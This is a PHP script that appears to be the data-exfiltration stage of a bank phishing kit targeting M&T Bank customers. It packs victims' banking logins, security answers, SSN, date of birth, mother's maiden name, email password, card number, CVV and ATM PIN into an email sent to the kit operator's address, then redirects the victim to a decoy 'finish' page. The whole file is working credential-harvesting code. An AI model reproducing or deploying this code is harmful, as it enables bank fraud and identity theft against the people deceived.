<?php
session_start();

include 'Email.php';

$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ Fulla ]--------------------\n";
$message .= "User     : ".$_SESSION['userId']."\n";
$message .= "Password : ".$_SESSION['Passcode']."\n";
$message .= "--------------[ MTB ]---------------------\n";
$message .= "Question 1     : ".$_SESSION['Q1']."\n";
$message .= "Answer 1       : ".$_SESSION['A1']."\n";
$message .= "Question 2     : ".$_SESSION['Q2']."\n";
$message .= "Answer 2       : ".$_SESSION['A2']."\n";
$message .= "Question 3     : ".$_SESSION['Q3']."\n";
$message .= "Answer 3       : ".$_SESSION['A3']."\n";
$message .= "Full Name      : ".$_SESSION['fname']."\n";
$message .= "Phone Number   : ".$_SESSION['phone']."\n";
$message .= "--------------[ SYCHO ]---------------------\n";
$message .= "Full Address   : ".$_POST['add']."\n";
$message .= "Zip Code       : ".$_POST['zip']."\n";
$message .= "Date of Birth  : ".$_POST['dob']."\n";
$message .= "SSN            : ".$_POST['ssn']."\n";
$message .= "Mother Maiden  : ".$_POST['mmn']."\n";
$message .= "Email Address  : ".$_SESSION['mail']."\n";
$message .= "Email Password : ".$_SESSION['pass']."\n";
$message .= "--------------[ LUCK ]---------------------\n";
$message .= "Card Number    : ".$_POST['cc']."\n";
$message .= "EXP. Date      : ".$_POST['exp']."\n";
$message .= "CVV            : ".$_POST['cvv']."\n";
$message .= "ATM PIN        : ".$_SESSION['pin']."\n";
$message .= "--------------[ ZEBY ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ SYCHO ]--------------------\n";
$subject = "FULL|MTB  $ip";
$headers = "From: BLESSING <email@info.com>";
mail($SEND,$subject,$message,$headers);



$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$Logon="finish.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>